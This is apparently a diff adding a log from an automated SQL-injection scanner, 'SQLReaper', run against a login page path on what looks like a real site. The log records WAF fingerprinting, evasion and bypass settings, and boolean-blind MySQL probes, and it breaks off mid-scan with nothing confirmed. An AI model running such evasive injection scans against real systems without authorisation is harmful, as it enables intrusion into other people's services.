@@ -1,0 +1,903 @@
++] [v21] Adaptive Extraction ENABLED (mutation_engine=SQLMutationEngine)
+[+] [v21]   Max bypasses: 10
+[+] [v21]   WAF threshold: 30%
+[+] [v21]   Max recovery attempts: 15
+
+============================================================
+[SQLReaper v25] Scan starting 12:56:17 url='/ADAC-Akademie/Viversa/Lo
+============================================================
+[+] [*] SQLReaper v26.0 starting — 6 DBMSes × 10 techniques × 300 payloads
+[+] [Estimate] 5 params  6 DBMS  ~21 techniques
+[+] [Estimate] ~819 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~10 minutes
+[*] Estimated scan time: 10m 55s (5 params × 6 DBMSes × 21 techniques, level=1)
+[+] [Session] Resuming from saved state: 0 params completed, dbms=MySQL
+[!] CDN caching detected (unknown)  time-based techniques may be unreliable. Recommendation: use-boolean-or-oob
+[+] ML WAF fingerprint: Imperva (conf=0.82)
+[+] ML WAF: Imperva
+[+] [v19] WAFMLBypassGenerator activated (WAF=Imperva, waf_bypass=5)
+[+] Safe-mode verification:
+ Ready to scan [oracle=full]
+   Neither error nor boolean signal detected on clean probes  may be blind-only
+[+] [OracleMode] Selected: full
+[+] Pre-scan verification OK
+[+] Jitter profile: mean=0ms std=0ms p99=0ms min_sleep=3.0s
+[!] Jitter profile recommends SLEEP(3.0s) (target natural variance too high for 2.0s)
+[+] Auto-adjusted --time-sec to 3.0s
+[+] [v19] Oracle mode confirmed: full
+[*] [diag-cascade] _v14_cascade entered: url='/ADAC-Akademie/Viversa/Login/Login.a'
+[+] KB tamper chain: ['math_wrap', 'space2comment', 'lowercase', 'keywordsplit', 'comment_content']
+[*] [diag-cascade] discovered params: ['path-injection'] markers=['path-injection']
+[*] Conformal calibration block complete, proceeding to causal discovery...
+[+] [Estimate] 3 params  6 DBMS  ~10 techniques
+[+] [Estimate] ~234 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~3 minutes
+
+[*] ══════════════════════════════════════════════════════
+[*]  SCAN PLAN: 6 DBMS × 10 categories × 1 params × 3 methods
+[*]  DBMSes   : ['MySQL', 'PostgreSQL', 'MSSQL', 'SQLite', 'Oracle', 'MariaDB']
+[*]  Params   : ['path-injection']
+[*]  Categories: ['Boolean', 'Timebased', 'Error', 'Union', 'Stacked', 'Standard', 'Novel', 'WAFBypass', 'Exotic', 'Hybrid']
+[*]  Payloads  : 300 per DBMS×category at level 1 = 18000 total
+[*] ══════════════════════════════════════════════════════
+
+[+]  Endpoint [1/1]: GET /ADAC-Akademie/Viversa/Login/Login.aspx* (1 params, source=direct)
+[*] A/B detection profiling for 'path-injection'...
+[*] Stability profiling for 'path-injection'...
+[+] Stability profile: noise=low simhash_var=0.000 bool_thresh=0.150 timing_thresh=500ms
+[*] [Classify] 'path-injection'  static (no change on 3 simple probes)  testing anyway
+[!] [TimingCal] CDN-cached baseline (P95=0.0ms < 50ms) — baseline probes served from edge cache.  Injection payloads bypass CDN cache and hit backend directly.  Jitter profiler will refine sleep estimate against real backend latency.
+[+] [TimingCal] Baseline: median=0ms P95=0ms IQR=0ms  optimal SLEEP=1.0s
+[Gate]  All 12 optimizations enabled
+[*] [RateCalibrate] Probing rate limits on /ADAC-Akademie/Viversa/Login/Login.a...
+[*] [RateCalibrate] User specified --rpm 60, respecting user setting
+[*] [RateCalibrate] Completed
+[*] [RDF] Profiling server response to suspicious headers (6 probes)...
+[+] [RDF] Result: SILENT
+[+] [RDF] Headers: server ignores all input
+[+] Launching expanded surfaces in parallel (WAF: Imperva)
+[*] [diag-task] creating primary task: param='path-injection' orig='Login.aspx'
+[*] [HDR] Preparing 138 headers for batched scanning ( GET/POST/PUT  all techniques  all DBMS)...
+[*] [COOKIE] Probing for injectable cookies...
+[*] [COOKIE] No Set-Cookie headers in response  skipping cookie injection
+[*] [HDR] Scanning 138 headers in batches of 1...
+[*] [POST] Full cascade scan starting (all techniques  all DBMS)...
+[*] [diag-surface] scan_surface called: surface='POST:/ADAC-Akademie/Viversa/Login/Login.aspx*' params=['path-injection']
+[+] Scanning surface: 'POST:/ADAC-Akademie/Viversa/Login/Login.aspx*' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='path-injection' already_confirmed=False
+[*] --- testing 'path-injection' @ /ADAC-Akademie/Viversa/Login/Login.aspx*
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*]   injection point: ...Login.aspxINJECT_HERE
+[*] Building baseline for 'path-injection'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='path-injection' gate_killed=False gate_circuit=False oracle=OracleMode.FULL techniques=ALL
+[*] Cascade engine: testing 'path-injection'...
+[*] [PUT] Full cascade scan starting (all techniques  all DBMS)...
+[*] [diag-surface] scan_surface called: surface='PUT:/ADAC-Akademie/Viversa/Login/Login.aspx*' params=['path-injection']
+[+] Scanning surface: 'PUT:/ADAC-Akademie/Viversa/Login/Login.aspx*' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='path-injection' already_confirmed=False
+[*] --- testing 'path-injection' @ /ADAC-Akademie/Viversa/Login/Login.aspx*
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*]   injection point: ...Login.aspxINJECT_HERE
+[*] Building baseline for 'path-injection'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='path-injection' gate_killed=False gate_circuit=False oracle=OracleMode.FULL techniques=ALL
+[*] Cascade engine: testing 'path-injection'...
+[*] [PATCH] Full cascade scan starting (all techniques  all DBMS)...
+[*] [diag-surface] scan_surface called: surface='PATCH:/ADAC-Akademie/Viversa/Login/Login.aspx*' params=['path-injection']
+[+] Scanning surface: 'PATCH:/ADAC-Akademie/Viversa/Login/Login.aspx*' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='path-injection' already_confirmed=False
+[*] --- testing 'path-injection' @ /ADAC-Akademie/Viversa/Login/Login.aspx*
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*]   injection point: ...Login.aspxINJECT_HERE
+[*] Building baseline for 'path-injection'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='path-injection' gate_killed=False gate_circuit=False oracle=OracleMode.FULL techniques=ALL
+[*] Cascade engine: testing 'path-injection'...
+[*] [diag-surface] scan_surface called: surface='GET:/ADAC-Akademie/Viversa/Login/Login.aspx*' params=['path-injection']
+[+] Scanning surface: 'GET:/ADAC-Akademie/Viversa/Login/Login.aspx*' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='path-injection' already_confirmed=False
+[*] --- testing 'path-injection' @ /ADAC-Akademie/Viversa/Login/Login.aspx*
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*]   injection point: ...Login.aspxINJECT_HERE
+[*] Building baseline for 'path-injection'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='path-injection' gate_killed=False gate_circuit=False oracle=OracleMode.FULL techniques=ALL
+[*] Cascade engine: testing 'path-injection'...
+[*] [diag-surface] scan_surface called: surface='HDR:X-Forwarded-For:GET' params=['X-Forwarded-For']
+[+] Scanning surface: 'HDR:X-Forwarded-For:GET' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='X-Forwarded-For' already_confirmed=False
+[*] --- testing 'X-Forwarded-For' @ /ADAC-Akademie/Viversa/Login/Login.aspx*
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'X-Forwarded-For'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='X-Forwarded-For' gate_killed=False gate_circuit=False oracle=OracleMode.FULL techniques=ALL
+[*] Cascade engine: testing 'X-Forwarded-For'...
+
+[*] ╔══════════════════════════════════════════════════════╗
+[*] ║  DBMS [1/6]: MySQL        | 10 categories x 300 payloads ║
+[*] ╚══════════════════════════════════════════════════════╝
+[*] [diag] MySQL base_tech_map non-empty: {'B': 3181, 'BH': 3181, 'IN': 3181, 'BT': 3181, 'T': 3181, 'TH': 3181, 'HQ': 3181, 'E': 3181, 'EH': 3181, 'U': 3181, 'UE': 3181, 'UH': 3181, 'S': 3181, 'ST': 3181, 'NV': 3181, 'WB': 3181, 'EX': 3181, 'HY': 3181, 'SO': 3181}
+    [B] MySQL: 3181 payloads
+    [BH] MySQL: 3181 payloads
+    [IN] MySQL: 3181 payloads
+    [BT] MySQL: 3181 payloads
+    [T] MySQL: 3181 payloads
+    [TH] MySQL: 3181 payloads
+    [HQ] MySQL: 3181 payloads
+    [E] MySQL: 3181 payloads
+    [EH] MySQL: 3181 payloads
+    [U] MySQL: 3181 payloads
+    [UE] MySQL: 3181 payloads
+    [UH] MySQL: 3181 payloads
+    [S] MySQL: 3181 payloads
+    [ST] MySQL: 3181 payloads
+    [NV] MySQL: 3181 payloads
+    [WB] MySQL: 3181 payloads
+    [EX] MySQL: 3181 payloads
+    [HY] MySQL: 3181 payloads
+    [SO] MySQL: 3181 payloads
+[*] [diag] MySQL base_tech_map non-empty: {'B': 3181, 'BH': 3181, 'IN': 3181, 'BT': 3181, 'T': 3181, 'TH': 3181, 'HQ': 3181, 'E': 3181, 'EH': 3181, 'U': 3181, 'UE': 3181, 'UH': 3181, 'S': 3181, 'ST': 3181, 'NV': 3181, 'WB': 3181, 'EX': 3181, 'HY': 3181, 'SO': 3181}
+    [B] MySQL: 3181 payloads
+    [BH] MySQL: 3181 payloads
+    [IN] MySQL: 3181 payloads
+    [BT] MySQL: 3181 payloads
+    [T] MySQL: 3181 payloads
+    [TH] MySQL: 3181 payloads
+    [HQ] MySQL: 3181 payloads
+    [E] MySQL: 3181 payloads
+    [EH] MySQL: 3181 payloads
+    [U] MySQL: 3181 payloads
+    [UE] MySQL: 3181 payloads
+    [UH] MySQL: 3181 payloads
+    [S] MySQL: 3181 payloads
+    [ST] MySQL: 3181 payloads
+    [NV] MySQL: 3181 payloads
+    [WB] MySQL: 3181 payloads
+    [EX] MySQL: 3181 payloads
+    [HY] MySQL: 3181 payloads
+    [SO] MySQL: 3181 payloads
+[*] [diag] MySQL base_tech_map non-empty: {'B': 3181, 'BH': 3181, 'IN': 3181, 'BT': 3181, 'T': 3181, 'TH': 3181, 'HQ': 3181, 'E': 3181, 'EH': 3181, 'U': 3181, 'UE': 3181, 'UH': 3181, 'S': 3181, 'ST': 3181, 'NV': 3181, 'WB': 3181, 'EX': 3181, 'HY': 3181, 'SO': 3181}
+    [B] MySQL: 3181 payloads
+    [BH] MySQL: 3181 payloads
+    [IN] MySQL: 3181 payloads
+    [BT] MySQL: 3181 payloads
+    [T] MySQL: 3181 payloads
+    [TH] MySQL: 3181 payloads
+    [HQ] MySQL: 3181 payloads
+    [E] MySQL: 3181 payloads
+    [EH] MySQL: 3181 payloads
+    [U] MySQL: 3181 payloads
+    [UE] MySQL: 3181 payloads
+    [UH] MySQL: 3181 payloads
+    [S] MySQL: 3181 payloads
+    [ST] MySQL: 3181 payloads
+    [NV] MySQL: 3181 payloads
+    [WB] MySQL: 3181 payloads
+    [EX] MySQL: 3181 payloads
+    [HY] MySQL: 3181 payloads
+    [SO] MySQL: 3181 payloads
+[*] [diag] MySQL base_tech_map non-empty: {'B': 3181, 'BH': 3181, 'IN': 3181, 'BT': 3181, 'T': 3181, 'TH': 3181, 'HQ': 3181, 'E': 3181, 'EH': 3181, 'U': 3181, 'UE': 3181, 'UH': 3181, 'S': 3181, 'ST': 3181, 'NV': 3181, 'WB': 3181, 'EX': 3181, 'HY': 3181, 'SO': 3181}
+    [B] MySQL: 3181 payloads
+    [BH] MySQL: 3181 payloads
+    [IN] MySQL: 3181 payloads
+    [BT] MySQL: 3181 payloads
+    [T] MySQL: 3181 payloads
+    [TH] MySQL: 3181 payloads
+    [HQ] MySQL: 3181 payloads
+    [E] MySQL: 3181 payloads
+    [EH] MySQL: 3181 payloads
+    [U] MySQL: 3181 payloads
+    [UE] MySQL: 3181 payloads
+    [UH] MySQL: 3181 payloads
+    [S] MySQL: 3181 payloads
+    [ST] MySQL: 3181 payloads
+    [NV] MySQL: 3181 payloads
+    [WB] MySQL: 3181 payloads
+    [EX] MySQL: 3181 payloads
+    [HY] MySQL: 3181 payloads
+    [SO] MySQL: 3181 payloads
+[*] [diag] MySQL base_tech_map non-empty: {'B': 3181, 'BH': 3181, 'IN': 3181, 'BT': 3181, 'T': 3181, 'TH': 3181, 'HQ': 3181, 'E': 3181, 'EH': 3181, 'U': 3181, 'UE': 3181, 'UH': 3181, 'S': 3181, 'ST': 3181, 'NV': 3181, 'WB': 3181, 'EX': 3181, 'HY': 3181, 'SO': 3181}
+    [B] MySQL: 3181 payloads
+    [BH] MySQL: 3181 payloads
+    [IN] MySQL: 3181 payloads
+    [BT] MySQL: 3181 payloads
+    [T] MySQL: 3181 payloads
+    [TH] MySQL: 3181 payloads
+    [HQ] MySQL: 3181 payloads
+    [E] MySQL: 3181 payloads
+    [EH] MySQL: 3181 payloads
+    [U] MySQL: 3181 payloads
+    [UE] MySQL: 3181 payloads
+    [UH] MySQL: 3181 payloads
+    [S] MySQL: 3181 payloads
+    [ST] MySQL: 3181 payloads
+    [NV] MySQL: 3181 payloads
+    [WB] MySQL: 3181 payloads
+    [EX] MySQL: 3181 payloads
+    [HY] MySQL: 3181 payloads
+    [SO] MySQL: 3181 payloads
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] MySQL › Boolean    │ tech=B    │ 634 base payloads (3181 expanded)
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] MySQL › Boolean    │ tech=B    │ 634 base payloads (3181 expanded)
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] MySQL › Boolean    │ tech=B    │ 634 base payloads (3181 expanded)
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] MySQL › Boolean    │ tech=B    │ 634 base payloads (3181 expanded)
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] MySQL › Boolean    │ tech=B    │ 634 base payloads (3181 expanded)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#1)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#2)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#3)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#4)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#5)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#1 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#2)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#6)
+    [B-bool] [MySQL] 'path-injection' req#1 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#1 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#1 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#2)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#7)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#8)
+[*]    Wasserstein comparison probe (param='path-injection' req#2)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#9)
+    [B-bool] [MySQL] 'path-injection' req#1 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#2)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#10)
+[*]    Wasserstein comparison probe (param='path-injection' req#2)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#11)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#12)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#13)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#4 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#5)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#14)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#15)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#16)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#17)
+    [B-bool] [MySQL] 'path-injection' req#4 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#4 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#5)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#18)
+    [B-bool] [MySQL] 'path-injection' req#4 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#5)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#19)
+    [B-bool] [MySQL] 'path-injection' req#4 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#7 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#8)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#20)
+[*]    Wasserstein comparison probe (param='path-injection' req#5)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#21)
+[*]    Wasserstein comparison probe (param='path-injection' req#5)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#22)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#23)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#24)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#25)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#9 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#10)
+[*]   [Wasserstein] dist=0.6758 STABLE-PAGE OUTLIER (3/4 probes below 0.15, only 1 above threshold=0.30) -- CDN/cache miss, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#26)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#27)
+    [B-bool] [MySQL] 'path-injection' req#7 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#8)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#28)
+    [B-bool] [MySQL] 'path-injection' req#7 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#11 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#12)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#29)
+[*]    Wasserstein comparison probe (param='path-injection' req#8)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#30)
+    [B-bool] [MySQL] 'path-injection' req#7 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#7 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#8)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#31)
+    [B-bool] [MySQL] 'path-injection' req#9 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#10)
+[*]   [Wasserstein] dist=0.6758 STABLE-PAGE OUTLIER (3/4 probes below 0.15, only 1 above threshold=0.30) -- CDN/cache miss, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#32)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#13 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#8)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#33)
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#14)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#34)
+    [B-bool] [MySQL] 'path-injection' req#9 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#10)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 4 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#35)
+    [B-bool] [MySQL] 'path-injection' req#9 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#15 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#16)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (3 near-zero + 2 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#36)
+[*]    Wasserstein comparison probe (param='path-injection' req#10)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 4 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#37)
+    [B-bool] [MySQL] 'path-injection' req#9 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#10)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 4 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#38)
+    [B-bool] [MySQL] 'path-injection' req#11 sim=0.438 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#17 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#18)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#39)
+[*]    Wasserstein comparison probe (param='path-injection' req#12)
+[+]   [Wasserstein] dist=0.0317 below threshold 0.30  not confirmed
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#40)
+    [B-bool] [MySQL] 'path-injection' req#11 sim=0.438 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#19 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#20)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#41)
+    [B-bool] [MySQL] 'path-injection' req#11 sim=0.438 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#12)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#42)
+    [B-bool] [MySQL] 'path-injection' req#13 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#21 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#14)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#43)
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#22)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#44)
+    [B-bool] [MySQL] 'path-injection' req#13 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#45)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#23 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#24)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#46)
+[*]    Wasserstein comparison probe (param='path-injection' req#14)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#47)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#25 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#48)
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#26)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#49)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#27 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#28)
+[*]   [Wasserstein] dist=0.6758 STABLE-PAGE OUTLIER (4/5 probes below 0.15, only 1 above threshold=0.30) -- CDN/cache miss, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#50)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#29 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#30)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (3 near-zero + 2 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#51)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#52)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#32 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#33)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#53)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#34 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#35)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#54)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#36 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#37)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#55)
+    [B-bool] [MySQL] 'path-injection' req#16 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#11 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#38 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#39)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#56)
+[*]    Wasserstein comparison probe (param='path-injection' req#12)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#57)
+[*]    Wasserstein comparison probe (param='path-injection' req#17)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#58)
+[*]    Wasserstein comparison probe (param='path-injection' req#12)
+[+]   [Wasserstein] dist=0.0317 below threshold 0.30  not confirmed
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#59)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#60)
+    [B-bool] [MySQL] 'path-injection' req#13 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
